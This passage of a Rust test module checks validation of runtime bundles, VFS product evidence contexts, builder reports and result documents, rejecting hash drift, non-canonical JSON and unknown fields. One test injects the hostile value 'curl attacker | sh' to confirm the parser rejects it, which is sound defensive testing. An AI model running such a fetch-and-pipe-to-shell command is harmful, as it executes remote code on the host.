        ProductCompositionV1, ProductSoftwareV1, VfsArchitectureV1, VfsEvidenceReferenceV1,
        VfsEvidenceV1, VfsProductCatalogEntryV1, VfsProductManifestV1,
    };
    use super::super::records::{ProductEvidenceDefinitionIdentityV1, ProductEvidenceDiagnosticV1};
    use super::*;
    use serde_json::json;
    use std::collections::BTreeMap;

    const SHA_A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const SHA_B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    const COMMIT: &str = "1111111111111111111111111111111111111111";
    const TREE: &str = "2222222222222222222222222222222222222222";

    fn bundle() -> (Vec<u8>, Vec<u8>) {
        let kernel = b"mini-kernel".to_vec();
        let mut inventory = vec![
            RuntimeInventoryEntryV1 {
                path: "browser/dist/service-worker.js".to_string(),
                sha256: sha256_bytes(b"worker"),
                bytes: 6,
            },
            RuntimeInventoryEntryV1 {
                path: "flake.lock".to_string(),
                sha256: sha256_bytes(b"lock\n"),
                bytes: 5,
            },
            RuntimeInventoryEntryV1 {
                path: "host/dist/index.js".to_string(),
                sha256: sha256_bytes(b"host"),
                bytes: 4,
            },
            RuntimeInventoryEntryV1 {
                path: "host/dist/node-kernel-worker-entry.js".to_string(),
                sha256: sha256_bytes(b"worker-entry"),
                bytes: 12,
            },
            RuntimeInventoryEntryV1 {
                path: "host/generated-abi.ts".to_string(),
                sha256: sha256_bytes(b"abi"),
                bytes: 3,
            },
            RuntimeInventoryEntryV1 {
                path: "host/package.json".to_string(),
                sha256: sha256_bytes(b"{\"type\":\"module\"}\n"),
                bytes: 18,
            },
            RuntimeInventoryEntryV1 {
                path: "host/worker-protocol.ts".to_string(),
                sha256: sha256_bytes(b"protocol"),
                bytes: 8,
            },
            RuntimeInventoryEntryV1 {
                path: "kernel.wasm".to_string(),
                sha256: sha256_bytes(&kernel),
                bytes: kernel.len() as u64,
            },
        ];
        inventory.sort_by(|left, right| left.path.cmp(&right.path));
        let host = inventory
            .iter()
            .filter(|entry| entry.path.starts_with("host/"))
            .cloned()
            .collect::<Vec<_>>();
        let browser = inventory
            .iter()
            .filter(|entry| entry.path.starts_with("browser/"))
            .cloned()
            .collect::<Vec<_>>();
        let bundle = ExactRuntimeBundleV1 {
            schema: 1,
            kind: "kandelo-exact-runtime-bundle".to_string(),
            source: RuntimeSourceIdentityV1 {
                repository: "kandelo-dev/kandelo".to_string(),
                commit: COMMIT.to_string(),
                tree: TREE.to_string(),
            },
            target_abi: RuntimeTargetAbiV1 {
                version: 8,
                snapshot_sha256: SHA_A.to_string(),
            },
            kernel: RuntimeKernelIdentityV1 {
                wasm_sha256: sha256_bytes(&kernel),
                bytes: kernel.len() as u64,
                abi_version: 8,
                snapshot_sha256: SHA_A.to_string(),
            },
            host: RuntimeHostIdentityV1 {
                bundle_sha256: canonical_sha256(&host).unwrap(),
                bytes: host.iter().map(|entry| entry.bytes).sum(),
                generated_abi_sha256: sha256_bytes(b"abi"),
                worker_protocol_sha256: sha256_bytes(b"protocol"),
            },
            browser: RuntimeBrowserIdentityV1 {
                bundle_sha256: canonical_sha256(&browser).unwrap(),
                bytes: browser.iter().map(|entry| entry.bytes).sum(),
                service_worker_sha256: sha256_bytes(b"worker"),
            },
            build_policy_sha256: SHA_B.to_string(),
            inventory,
        };
        (canonical_json_bytes(&bundle).unwrap(), kernel)
    }

    fn definition() -> GeneratedEvidenceDefinitionV1 {
        let mut probe = toml::map::Map::new();
        probe.insert(
            "argv".to_string(),
            toml::Value::Array(vec![toml::Value::String("/bin/sh".to_string())]),
        );
        probe.insert(
            "stdout_exact".to_string(),
            toml::Value::String("ready\n".to_string()),
        );
        let mut definition = GeneratedEvidenceDefinitionV1 {
            id: "mini-node".to_string(),
            host: EvidenceHostV1::Node,
            runner: EvidenceRunnerV1::Exec,
            timeout_seconds: 60,
            probe: toml::Value::Table(probe),
            implementation: [
                "apps/browser-demos/lib/mysql-client.ts",
                "apps/browser-demos/lib/redis-client.ts",
                "flake.lock",
                "flake.nix",
                "host/package-lock.json",
                "host/package.json",
                "host/src/generated/abi.ts",
                "host/src/homebrew-bottle-relocation.ts",
                "host/src/homebrew-guest-layout.ts",
                "host/src/pathconf.ts",
                "host/src/statfs.ts",
                "host/src/vfs/deferred-tree-limits.ts",
                "host/src/vfs/hardlink-graph.ts",
                "host/src/vfs/load-image.ts",
                "host/src/vfs/memory-fs.ts",
                "host/src/vfs/sharedfs-vendor.ts",
                "package-lock.json",
                "package.json",
                "scripts/abi-staging-product-node-evidence.ts",
                "scripts/check-dev-shell-tools.sh",
                "scripts/dev-shell.sh",
                "tools/xtask/src/abi_staging/evidence_policy.rs",
            ]
            .into_iter()
            .enumerate()
            .map(|(index, path)| EvidenceImplementationV1 {
                path: path.to_string(),
                sha256: if index % 2 == 0 { SHA_A } else { SHA_B }.to_string(),
            })
            .collect(),
            definition_sha256: String::new(),
        };
        definition.definition_sha256 = generated_definition_sha256(&definition).unwrap();
        definition
    }

    fn context(vfs: &[u8]) -> (NodeProductEvidenceContextV1, Vec<u8>, Vec<u8>) {
        let (bundle, kernel) = bundle();
        let mut context = NodeProductEvidenceContextV1 {
            schema: 1,
            kind: CONTEXT_KIND.to_string(),
            request_digest: SHA_A.to_string(),
            product: ProductEvidenceResultProductV1 {
                id: "mini-product".to_string(),
                manifest_sha256: SHA_B.to_string(),
            },
            candidate_product: CandidateProductEvidenceIdentityV1 {
                manifest_digest: format!("sha256:{SHA_A}"),
                vfs_layer_sha256: sha256_bytes(vfs),
                vfs_layer_bytes: vfs.len() as u64,
                builder_report_sha256: SHA_B.to_string(),
            },
            runtime: runtime_identity_from_bundle(&bundle).unwrap(),
            host: EvidenceHostV1::Node,
            definition: definition(),
            boot: VfsBootContractV1 {
                argv: vec!["/bin/sh".to_string()],
                cwd: "/".to_string(),
                uid: 0,
                gid: 0,
                env: BTreeMap::from([("HOME".to_string(), "/root".to_string())]),
            },
            mounts: vec![VfsMountIntentV1::BuiltImage {
                path: "/".to_string(),
                readonly: false,
            }],
            run: ProductEvidenceRunV1 {
                repository: "kandelo-dev/kandelo".to_string(),
                workflow_ref: "kandelo-dev/kandelo/.github/workflows/evidence.yml@protected"
                    .to_string(),
                run_id: 1,
                job_id: "node-evidence".to_string(),
                attempt: 1,
            },
        };
        context.product.manifest_sha256 =
            canonical_sha256(&mini_product_manifest(&context)).unwrap();
        (context, bundle, kernel)
    }

    fn result(context: &NodeProductEvidenceContextV1) -> ProductEvidenceResultV1 {
        ProductEvidenceResultV1 {
            schema: 1,
            kind: RESULT_KIND.to_string(),
            request_digest: context.request_digest.clone(),
            product: context.product.clone(),
            candidate_product: context.candidate_product.clone(),
            runtime: context.runtime.clone(),
            host: VerificationHostV1::Node,
            definition: ProductEvidenceDefinitionIdentityV1 {
                id: context.definition.id.clone(),
                definition_sha256: context.definition.definition_sha256.clone(),
            },
            outcome: ProductEvidenceOutcomeV1::Success,
            guard_codes: Vec::new(),
            bounded_diagnostics: Vec::new(),
            run: context.run.clone(),
        }
    }

    fn locator(context: &NodeProductEvidenceContextV1) -> CandidateProductLocatorV1 {
        let repository = format!(
            "ghcr.io/kandelo-dev/homebrew-tap-core-abi-{}-candidates/products/{}",
            context.runtime.target_abi.version, context.product.id
        );
        CandidateProductLocatorV1 {
            product_id: context.product.id.clone(),
            immutable_reference: format!(
                "{}@{}",
                repository, context.candidate_product.manifest_digest
            ),
            repository,
            manifest_digest: context.candidate_product.manifest_digest.clone(),
            vfs_layer_sha256: context.candidate_product.vfs_layer_sha256.clone(),
            vfs_layer_bytes: context.candidate_product.vfs_layer_bytes,
            builder_report_sha256: context.candidate_product.builder_report_sha256.clone(),
        }
    }

    fn candidate_documents(
        context: &mut NodeProductEvidenceContextV1,
    ) -> (
        ResolvedVfsProductInputsV1,
        Vec<u8>,
        VfsBuilderReportV1,
        Vec<u8>,
    ) {
        let product = VfsProductIdentityV1 {
            id: context.product.id.clone(),
            manifest_path: "images/vfs/products/mini-product.toml".to_string(),
            manifest_sha256: context.product.manifest_sha256.clone(),
            architecture: VfsArchitectureV1::Wasm32,
            output: "mini-product.vfs".to_string(),
        };
        let target_abi = TargetAbiV1 {
            version: u64::from(context.runtime.target_abi.version),
            snapshot_sha256: context.runtime.target_abi.snapshot_sha256.clone(),
        };
        let resolved = ResolvedVfsProductInputsV1 {
            schema: 1,
            kind: "kandelo-resolved-vfs-product-inputs".to_string(),
            product: product.clone(),
            target_abi: target_abi.clone(),
            build_environment: VfsBuildEnvironmentV1 {
                policy_sha256: context.runtime.build_policy_sha256.clone(),
                dev_shell_lock_sha256: sha256_bytes(b"lock\n"),
            },
            reference_class: VfsReferenceClassV1::Candidate,
            source: ExactSourceV1 {
                repository: context.runtime.source.repository.clone(),
                commit: context.runtime.source.commit.clone(),
                tree: context.runtime.source.tree.clone(),
            },
            inputs: Vec::new(),
        };
        let resolved_bytes = canonical_json_bytes(&resolved).unwrap();
        let report = VfsBuilderReportV1 {
            schema: 1,
            kind: "kandelo-vfs-builder-report".to_string(),
            product,
            resolved_inputs_sha256: sha256_bytes(&resolved_bytes),
            output: VfsBuilderOutputV1 {
                path: "mini-product.vfs".to_string(),
                name: "mini-product.vfs".to_string(),
                sha256: context.candidate_product.vfs_layer_sha256.clone(),
                bytes: context.candidate_product.vfs_layer_bytes,
                abi: target_abi,
            },
            inputs: Vec::new(),
            capture: VfsBuilderCaptureV1 {
                complete: true,
                unreported_reads: Vec::new(),
            },
        };
        let report_bytes = canonical_json_bytes(&report).unwrap();
        context.candidate_product.builder_report_sha256 = sha256_bytes(&report_bytes);
        (resolved, resolved_bytes, report, report_bytes)
    }

    fn mini_product_manifest(context: &NodeProductEvidenceContextV1) -> VfsProductManifestV1 {
        VfsProductManifestV1 {
            schema: 1,
            id: context.product.id.clone(),
            architecture: VfsArchitectureV1::Wasm32,
            output: "mini-product.vfs".to_string(),
            builder: "images/vfs/scripts/build-mini-product.sh".to_string(),
            composition: ProductCompositionV1::default(),
            software: ProductSoftwareV1::default(),
            mounts: context.mounts.clone(),
            boot: Some(context.boot.clone()),
            evidence: VfsEvidenceV1 {
                node: Some(VfsEvidenceReferenceV1 {
                    test: context.definition.id.clone(),
                }),
                browser: None,
            },
        }
    }

    fn authorities(
        context: &NodeProductEvidenceContextV1,
    ) -> (GeneratedEvidenceDefinitionRegistryV1, VfsProductCatalogV1) {
        let definitions = GeneratedEvidenceDefinitionRegistryV1 {
            schema: 1,
            kind: "kandelo-vfs-evidence-definitions".to_string(),
            version: 1,
            definitions: vec![context.definition.clone()],
        };
        let manifest = mini_product_manifest(context);
        let products = VfsProductCatalogV1 {
            schema: 1,
            kind: "kandelo-vfs-product-catalog".to_string(),
            products: vec![VfsProductCatalogEntryV1 {
                path: "images/vfs/products/mini-product.toml".to_string(),
                sha256: canonical_sha256(&manifest).unwrap(),
                manifest,
            }],
        };
        (definitions, products)
    }

    #[test]
    fn validates_exact_generic_node_context_and_result() {
        let vfs = b"mini-vfs";
        let (context, bundle, kernel) = context(vfs);
        let (definitions, products) = authorities(&context);
        validate_node_context(
            &context,
            &locator(&context),
            &definitions,
            &products,
            &bundle,
            vfs,
            &kernel,
        )
        .unwrap();
        validate_product_evidence_result(&result(&context), Some(&context)).unwrap();

        let mut substituted_context = context.clone();
        let mut substituted_products = products.clone();
        substituted_context.boot.cwd = "/tmp".to_string();
        substituted_products.products[0]
            .manifest
            .boot
            .as_mut()
            .unwrap()
            .cwd = "/tmp".to_string();
        assert!(
            validate_node_context(
                &substituted_context,
                &locator(&substituted_context),
                &definitions,
                &substituted_products,
                &bundle,
                vfs,
                &kernel,
            )
            .unwrap_err()
            .contains("catalog manifest digest")
        );
    }

    #[test]
    fn runtime_identity_requires_the_exact_dev_shell_lock_inventory_entry() {
        let (bundle, _) = bundle();
        let mut parsed: ExactRuntimeBundleV1 = serde_json::from_slice(&bundle).unwrap();
        parsed.inventory.retain(|entry| entry.path != "flake.lock");
        let missing = canonical_json_bytes(&parsed).unwrap();
        assert!(
            runtime_identity_from_bundle(&missing)
                .unwrap_err()
                .contains("flake.lock")
        );
    }

    #[test]
    fn binds_candidate_resolved_inputs_and_builder_report_to_protected_authorities() {
        let vfs = b"mini-vfs";
        let (mut context, bundle_bytes, _) = context(vfs);
        let (resolved, resolved_bytes, report, report_bytes) = candidate_documents(&mut context);
        let (_, products) = authorities(&context);
        let runtime_bundle: ExactRuntimeBundleV1 = serde_json::from_slice(&bundle_bytes).unwrap();
        validate_candidate_product_documents(
            &context,
            &locator(&context),
            &products,
            &runtime_bundle,
            &resolved_bytes,
            &resolved,
            &report_bytes,
            &report,
        )
        .unwrap();

        let mut wrong_policy = resolved.clone();
        wrong_policy.build_environment.policy_sha256 = SHA_A.to_string();
        let wrong_policy_bytes = canonical_json_bytes(&wrong_policy).unwrap();
        assert!(
            validate_candidate_product_documents(
                &context,
                &locator(&context),
                &products,
                &runtime_bundle,
                &wrong_policy_bytes,
                &wrong_policy,
                &report_bytes,
                &report,
            )
            .unwrap_err()
            .contains("runtime policy")
        );

        let mut wrong_lock = resolved.clone();
        wrong_lock.build_environment.dev_shell_lock_sha256 = SHA_A.to_string();
        let wrong_lock_bytes = canonical_json_bytes(&wrong_lock).unwrap();
        assert!(
            validate_candidate_product_documents(
                &context,
                &locator(&context),
                &products,
                &runtime_bundle,
                &wrong_lock_bytes,
                &wrong_lock,
                &report_bytes,
                &report,
            )
            .unwrap_err()
            .contains("runtime lock")
        );
    }

    #[test]
    fn rejects_candidate_runtime_kernel_and_definition_drift() {
        let vfs = b"mini-vfs";
        let (mut context, bundle, kernel) = context(vfs);
        let (definitions, products) = authorities(&context);
        assert!(
            validate_node_context(
                &context,
                &locator(&context),
                &definitions,
                &products,
                &bundle,
                b"other",
                &kernel,
            )
            .is_err()
        );
        assert!(
            validate_node_context(
                &context,
                &locator(&context),
                &definitions,
                &products,
                b"{}\n",
                vfs,
                &kernel,
            )
            .is_err()
        );
        assert!(
            validate_node_context(
                &context,
                &locator(&context),
                &definitions,
                &products,
                &bundle,
                vfs,
                b"other",
            )
            .is_err()
        );
        context.definition.definition_sha256 = SHA_A.to_string();
        assert!(
            validate_node_context(
                &context,
                &locator(&context),
                &definitions,
                &products,
                &bundle,
                vfs,
                &kernel,
            )
            .is_err()
        );
    }

    #[test]
    fn parses_only_canonical_closed_documents() {
        let (context, _, _) = context(b"mini-vfs");
        let canonical = canonical_json_bytes(&context).unwrap();
        assert_eq!(parse_node_context(&canonical).unwrap(), context);
        let mut noncanonical = serde_json::to_vec_pretty(&context).unwrap();
        noncanonical.push(b'\n');
        assert!(parse_node_context(&noncanonical).is_err());
        let mut value = serde_json::to_value(&context).unwrap();
        value["candidate_command"] = json!("curl attacker | sh");
        assert!(parse_node_context(&canonical_json_bytes(&value).unwrap()).is_err());
    }

    #[test]
    fn requires_exact_terminal_guard_mapping() {
        let (context, _, _) = context(b"mini-vfs");
        let mut value = result(&context);
        value.outcome = ProductEvidenceOutcomeV1::Failure;
        assert!(validate_product_evidence_result(&value, None).is_err());
        value.guard_codes = vec![GuardCodeV1::VerificationFailed];
        validate_product_evidence_result(&value, None).unwrap();
        value.outcome = ProductEvidenceOutcomeV1::Timeout;
        assert!(validate_product_evidence_result(&value, None).is_err());
        value.guard_codes = vec![GuardCodeV1::VerificationTimeout];
        validate_product_evidence_result(&value, None).unwrap();
    }

    #[test]
    fn checks_sorted_bounded_diagnostic_bytes() {
        let (context, _, _) = context(b"mini-vfs");
        let mut value = result(&context);
        value.bounded_diagnostics = vec![ProductEvidenceDiagnosticV1 {
            id: "stdout".to_string(),
            sha256: sha256_bytes(b"ready\n"),
            bytes: 6,
            text: "ready\n".to_string(),
        }];
        validate_product_evidence_result(&value, None).unwrap();
        value.bounded_diagnostics[0].bytes += 1;
        assert!(validate_product_evidence_result(&value, None).is_err());
    }

    #[test]
    fn result_must_bind_the_exact_context() {
        let (context, _, _) = context(b"mini-vfs");
        let mut value = result(&context);
        value.request_digest = SHA_B.to_string();
        assert!(validate_product_evidence_result(&value, Some(&context)).is_err());
    }
}
